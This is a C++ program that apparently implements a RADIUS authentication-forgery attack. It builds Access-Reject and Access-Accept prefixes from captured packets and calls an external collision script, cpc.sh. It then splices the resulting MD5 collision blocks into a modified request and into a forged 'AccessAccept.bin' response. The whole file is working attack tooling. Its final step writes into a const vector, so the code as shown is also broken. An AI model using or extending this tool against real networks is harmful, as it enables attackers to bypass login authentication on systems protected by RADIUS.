#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <cstdlib>

// Convert hex string to bytes
std::vector<uint8_t> hexStringToBytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        uint8_t byte = static_cast<uint8_t>(strtol(byteString.c_str(), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Convert bytes to hex string
std::string bytesToHexString(const std::vector<uint8_t>& bytes) {
    std::ostringstream oss;
    for (uint8_t byte : bytes) {
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
    }
    return oss.str();
}

// Write data to file
void writeToFile(const std::string& filename, const std::vector<uint8_t>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (file.is_open()) {
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        file.close();
    } else {
        std::cerr << "Failed to open file: " << filename << std::endl;
    }
}

// Read data from file
std::vector<uint8_t> readFromFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    std::vector<uint8_t> data;

    if (file.is_open()) {
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);

        data.resize(size);
        file.read(reinterpret_cast<char*>(data.data()), size);
        file.close();
    } else {
        std::cerr << "Failed to open file: " << filename << std::endl;
    }

    return data;
}

// Construct packets and modify prefixes
void constructPackets(const std::string& requestHex, const std::string& rejectHex) {
    std::vector<uint8_t> requestBytes = hexStringToBytes(requestHex);
    std::vector<uint8_t> rejectBytes = hexStringToBytes(rejectHex);

    if (requestBytes.size() < 20) {
        std::cerr << "Request packet is too short!" << std::endl;
        return;
    }

    std::vector<uint8_t> rejectPrefix(requestBytes.begin(), requestBytes.begin() + 20);
    rejectPrefix.push_back(0x33);
    rejectPrefix.push_back(0x6A);

    // Modify the third and fourth bytes (Len)
    uint16_t value = rejectBytes.size() + 109;
    rejectPrefix[2] = (value >> 8) & 0xFF;
    rejectPrefix[3] = value & 0xFF;

    // Modify the first byte
    rejectPrefix[0] = 0x03;

    std::string rejectPrefixHex = bytesToHexString(rejectPrefix);
    std::cout << "RejectPrefix: " << rejectPrefixHex << std::endl;

    // Generate AcceptPrefix
    std::vector<uint8_t> acceptPrefix = rejectPrefix;
    acceptPrefix[0] = 0x02;

    std::string acceptPrefixHex = bytesToHexString(acceptPrefix);
    std::cout << "AcceptPrefix: " << acceptPrefixHex << std::endl;

    // Write to files
    writeToFile("RejectPrefix.bin", rejectPrefix);
    writeToFile("AcceptPrefix.bin", acceptPrefix);
}

// Modify request and write to file
void modifyAndWriteRequest(const std::vector<uint8_t>& requestBytes) {
    std::vector<uint8_t> collData = readFromFile("RejectPrefix.bin.coll");

    if (requestBytes.size() > 20) {
        std::vector<uint8_t> remainingRequest(requestBytes.begin() + 20, requestBytes.end());
        collData.insert(collData.end(), remainingRequest.begin(), remainingRequest.end());
    }

    if (!collData.empty()) {
        collData[0] = 0x01;
    }

    writeToFile("modified_request.bin", collData);
}

// Modify reject and write to AccessAccept.bin
void modifyAndWriteAccessAccept(const std::vector<uint8_t>& rejectBytes) {
    std::vector<uint8_t> collData = readFromFile("AcceptPrefix.bin.coll");

    if (collData.size() >= 128) {
        std::copy(collData.begin(), collData.begin() + 128, rejectBytes.begin());
    } else {
        std::cerr << "AcceptPrefix.bin.coll is too short!" << std::endl;
        return;
    }

    writeToFile("AccessAccept.bin", rejectBytes);
}

int main() {
    std::string requestHex;
    std::cout << "Enter request packet in hex: ";
    std::cin >> requestHex;

    std::string rejectHex;
    std::cout << "Enter reject packet in hex: ";
    std::cin >> rejectHex;

    constructPackets(requestHex, rejectHex);

    // Run script
    int result = std::system("../scripts/cpc.sh RejectPrefix.bin AcceptPrefix.bin");
    if (result != 0) {
        std::cerr << "Failed to run script" << std::endl;
    }

    // Read and modify request
    std::vector<uint8_t> requestBytes = hexStringToBytes(requestHex);
    modifyAndWriteRequest(requestBytes);

    // Enter second reject
    std::string secondRejectHex;
    std::cout << "Enter second reject packet in hex: ";
    std::cin >> secondRejectHex;

    // Process second reject
    std::vector<uint8_t> secondRejectBytes = hexStringToBytes(secondRejectHex);
    modifyAndWriteAccessAccept(secondRejectBytes);

    return 0;
}
